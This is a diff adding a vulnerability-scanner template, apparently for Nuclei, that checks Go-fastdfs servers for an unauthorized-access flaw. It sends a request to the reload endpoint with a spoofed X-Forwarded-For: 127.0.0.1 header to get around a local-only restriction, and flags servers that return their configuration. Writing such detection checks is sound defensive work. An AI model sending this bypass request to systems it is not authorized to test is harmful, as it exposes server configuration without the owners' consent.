@@ -1,0 +1,30 @@
+id: Go-fastdfs-reload-bypass
+
+info:
+  name: Go-fastdfs 未授权
+  author: fastdfs
+  severity: medium
+  tags: fastdfs
+
+http:
+  - raw:
+      - |+
+        GET /group1/reload?action=get HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Accept: */*
+        X-Forwarded-for: 127.0.0.1
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'alarm_url'
+          - 'download_use_token'
+          - 'queue_size'
+        condition: and
+      - type: status
+        status: 
+          - 200
